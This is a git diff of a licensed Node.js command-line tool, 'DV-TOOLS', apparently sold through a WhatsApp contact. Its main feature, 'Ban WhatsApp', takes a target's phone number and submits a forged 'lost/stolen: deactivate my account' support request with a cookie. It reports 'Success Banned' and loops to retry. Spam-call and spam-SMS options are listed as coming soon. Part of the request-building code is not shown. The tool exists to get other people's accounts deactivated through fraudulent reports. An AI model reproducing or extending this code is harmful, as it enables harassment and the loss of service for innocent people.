@@ -1,59 +1,63 @@
 const { exec } = require('child_process')
 const axios = require('axios').default
 const cheerio = require('cheerio')
-const util = require('node:util')
-const readline = require('node:readline')
-const rdline = readline.createInterface({input: process.stdin,output: process.stdout});
+const util = require('util')
+const fs = require('fs')
+const readline = require('readline')
+const rl = readline.createInterface({input: process.stdin,output: process.stdout});
 
-const key = '4064636F646564656E7061'
+const keyfile = fs.readFileSync('./license.txt');
+axios.get(`https://rasitechchannel.my.id/token1/token.txt`).then(res => {
+const key = res.data;
 
 const login = () => {
 return new Promise((resolve) => {
-rdline.question("License Token: ", token => {
+rl.question("License Key: ", token => {
 if (token == key) {
-menu()
+fs.writeFile('./license.txt', key, function (err) {
+if (err) throw err;})
+menu();
 } else {
-console.log("\x1b[41m", 'Wrong Token!, Please Contact wa.me/6285866295942', '\x1b[0m')
-exec(`xdg-open https://wa.me/6285866295942?text=buy+license+[dv-tools]`, (error, stdout, stderr) => {});
-setTimeout (() => {console.clear();login()},3000);}});});};
+console.log("\x1b[41m", 'Wrong Key!, Please Contact wa.me/6285866295942', '\x1b[0m')
+exec(`xdg-open https://wa.me/6285866295942?text=buy+license+key+[dv-tools]`, (error, stdout, stderr) => {});
+setTimeout (() => {console.clear();login()},5000);}})});}
 
 const menu = () => {
 return new Promise((resolve) => {
 console.clear()
-rdline.question("Menu:\n1.Start\n2.Join Grup\n3.Update Script\n4.Exit\nAnswer: ", menua => {
+rl.question("---===(DV-TOOLS)===---\n\n[1].Start Script\n\n[2].Update Script\n\n[3].Join Grup\n\n[4].Exit\n\nChoose (1-4)\n>", menua => {
 if (menua == 1) {
 start();
 } else if (menua == 2){ 
-exec(`xdg-open https://chat.whatsapp.com/Dgt6JhzTvlmEor8Zz23fHx`, (error, stdout, stderr) => {});
-console.clear();
-menu();
-} else if (menua == 3){ 
 exec(`git pull`, (error, stdout, stderr) => {});
-setTimeout (() => {resolve(menu());},3000);
+setTimeout (() => {resolve(menu());},15000);
+} else if (menua == 3){ 
+exec(`xdg-open https://chat.whatsapp.com/Dgt6JhzTvlmEor8Zz23fHx`, (error, stdout, stderr) => {});
+setTimeout (() => {console.clear();menu()},5000);
 } else if (menua == 4){ 
-rdline.close();
+rl.close();
 } else {
 console.log("\x1b[41m", 'Command not Found!', '\x1b[0m')
-setTimeout (() => {resolve(menu());},3000);}});});};
+setTimeout (() => {resolve(menu());},5000);}});});};
 
 const start = () => {
 return new Promise((resolve) => {
 console.clear()
-rdline.question("Menu:\n1.Ban WhatsApp\n2.Spam Call\n3.Spam Sms\n4.Back\n5.Exit\nAnswer: ", starta => {
+rl.question("---===(LIST-MENU)===---\n\n[1].Ban WhatsApp\n\n[2].Spam Call {soon}\n\n[3].Spam Sms {soon}\n\n[4].Back\n\n[5].Exit\n\nChoose (1-5)\n>", starta => {
 if (starta == 1) {
 banwa();
 } else if (starta == 4){ 
 menu();
 } else if (starta == 5){ 
-rdline.close();
+rl.close();
 } else {
 console.log("\x1b[41m", 'Command not Found!', '\x1b[0m')
-setTimeout (() => {resolve(start());},3000);}});});};
+setTimeout (() => {resolve(start());},5000);}});});};
 
 const banwa = () => {
 return new Promise((resolve) => {
 console.clear()
-rdline.question("Enter Number: ", async (nomor) => {
+rl.question("Enter Number (+62xxx): ", async (nomor) => {
 var nom = nomor
 if (!nom.startsWith("+")) nom = "+"+nomor
 var finding = await (await require ("awesome-phonenumber")(nom)).g
@@ -84,24 +88,30 @@ form.append("__rev", "1006630858")
 form.append("__comment_req", "0")
 var res = await axios({url,method: "POST",data: form,headers: {cookie}})
 if (res.data.includes("true")) {
-console.log("\x1b[32m", `Success Banned: ${nom}\n\nResults: Data ${util.format(JSON.parse(res.data.replace("for (;;);", "")))}\n\nParams: ${util.format(form)}`, '\x1b[0m'.replace("Perdido/roubado: desative minha conta", "CENSORED").replace(email.data[0], "CENSORED").replace(email.data[0], "CENSORED"))
-rdline.question("Success Banned, Want to Retry? (y or n) ", async (banwaa) => {
+console.log("\x1b[32m",`Success Banned: ${nom}\n\nResults: Data ${util.format(JSON.parse(res.data.replace("for (;;);", "")))}\n\nParams: ${util.format(form)}`.replace("Perdido/roubado: desative minha conta", "CENSORED").replace(email.data[0], "CENSORED").replace(email.data[0], "CENSORED"),'\x1b[0m')
+rl.question("Success Banned, Want to Retry? (y/n): ", async (banwaa) => {
 if (banwaa == 'y') {
 banwa();
 } else if (banwaa== 'n'){ 
 start();
 } else {
-console.log("\x1b[41m", 'Command not Found, Back to Menu!', '\x1b[0m')
-setTimeout (() => {resolve(menu());},3000);}})
+banwa();}})
 } else {
-console.log("\x1b[41m", 'Error: Please try another Number', '\x1b[0m')
-setTimeout (() => {banwa();},3000);}});});};
+console.log("\x1b[41m", 'Error: Please try another Number!', '\x1b[0m')
+setTimeout (() => {banwa();},5000);}});});};
 
-const main = async () => {
-console.clear()
-login();}
-main();
-
-rdline.on('close', () => {
+rl.on('close', () => {
 console.log("\x1b[44m", 'Closed, Have a Great day!', '\x1b[0m');
 process.exit(0);});
+
+console.clear()
+keyfile
+if (keyfile == key){
+exec(`xdg-open https://youtube.com/@dcodedenpa`, (error, stdout, stderr) => {});
+setTimeout (() => {menu();},5000);
+} else if (keyfile == !key){
+login();
+} else {
+console.log("\x1b[41m", 'License Key has been Changed by Developer!', '\x1b[0m')
+exec(`xdg-open https://wa.me/6285866295942?text=give+new+license+key+[dv-tools]`, (error, stdout, stderr) => {});
+setTimeout (() => {login();},5000)};})
